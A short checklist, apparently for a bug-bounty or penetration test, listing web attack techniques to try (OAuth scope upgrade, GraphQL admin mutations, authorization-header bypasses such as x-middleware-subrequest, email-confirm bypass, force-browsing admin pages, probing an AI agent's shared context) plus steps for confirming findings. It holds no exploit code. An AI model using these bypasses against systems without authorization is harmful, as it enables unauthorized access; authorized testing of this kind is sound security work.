[ ] OAuth token-exchange scope upgrade
[ ] SCIM /scim/v2/ probe (externalId test)
[ ] GraphQL introspect → admin mutations
[ ] Apollo Federation interface-directive bypass
[ ] Email-confirm bypass on every invitation flow
[ ] Force-browse admin (SecLists + custom)
[ ] Header trust (x-middleware-subrequest, X-Forwarded-For, X-Original-URL)
[ ] WebSocket per-message authz
[ ] AI agent shared-context probe
[ ] Customer-success tool probe

VALIDATION:
[ ] Account L reproduces → confirmed (3x per CLAUDE-RULES/16)
[ ] Exact request + response captured
[ ] Account tagged on every screenshot
[ ] No "potentially" / "could" language
[ ] Severity floor checked against target.json
```

